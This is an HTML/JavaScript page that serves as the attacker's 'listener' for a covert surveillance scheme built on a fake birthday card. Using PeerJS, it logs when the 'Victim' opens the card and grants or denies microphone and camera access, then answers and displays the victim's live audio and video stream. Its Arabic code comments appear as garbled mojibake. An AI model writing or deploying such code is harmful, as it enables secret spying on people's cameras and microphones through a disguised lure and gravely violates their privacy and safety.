<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>ğŸ§ Listener</title>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
  <style>
    body { 
      font-family: sans-serif; 
      text-align: center; 
      padding: 1rem; 
    }
    #logs { 
      text-align: left; 
      max-width: 400px; 
      margin: 1rem auto; 
    }
    #remoteStream {
      width: 300px;
      border-radius: 10px;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <h2>ğŸ‘‚ Listening for Card Events</h2>
  <div id="logs"><strong>Events:</strong><ul id="events"></ul></div>
  <video id="remoteStream" autoplay playsinline></video>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer = new Peer(LISTENER_ID, { debug: 2 });
    const eventsUl = document.getElementById('events');

    function log(msg) {
      const li = document.createElement('li');
      li.textContent = msg;
      eventsUl.appendChild(li);
    }

    peer.on('open', () => {
      log(`ğŸ”Œ Listener ready as "${LISTENER_ID}"`);
    });

    // Ø§Ø³ØªÙ‚Ø¨Ù„ DataChannel Ù„Ù„Ø£Ø­Ø¯Ø§Ø«
    peer.on('connection', conn => {
      conn.on('data', data => {
        if (data.event === 'page-open')   log('ğŸ“¥ Victim opened the card');
        if (data.event === 'mic-allowed') log('âœ” Victim allowed mic & camera');
        if (data.event === 'mic-denied')  log('âœ– Victim denied mic/camera');
      });
    });

    // Ø§Ø³ØªÙ‚Ø¨Ù„ Ø¨Ø« Ø§Ù„ØµÙˆØª ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ
    peer.on('call', call => {
      log('ğŸ“ Incoming media call');
      call.answer(); 
      call.on('stream', remoteStream => {
        document.getElementById('remoteStream').srcObject = remoteStream;
        log('ğŸ¥ Audio/Video stream started');
      });
    });

    peer.on('error', err => {
      console.error(err);
      log('â— Error: ' + err);
    });
  </script>
</body>
</html>
